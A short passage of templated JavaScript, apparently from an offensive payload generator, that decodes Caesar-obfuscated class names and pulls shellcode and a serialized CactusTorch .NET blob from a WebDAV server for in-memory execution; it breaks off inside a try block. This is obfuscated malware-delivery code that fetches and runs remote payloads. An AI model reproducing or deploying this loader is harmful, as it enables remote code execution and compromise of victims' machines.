...
var ${varBinary} = ${funcInvertCaesar}(${caesarKey},"${binary}");
var ${varEntryClass} = ${funcInvertCaesar}(${caesarKey},"${entryClass}");
var ${varShellcode} = LoadTemplates("\\\\" + ${varWebDavServer} + "\\shellcode");

try {
	var stm = Base64ToStream(LoadTemplates("\\\\" + ${varWebDavServer} + "\\cactusTorch_serialized.bin"))
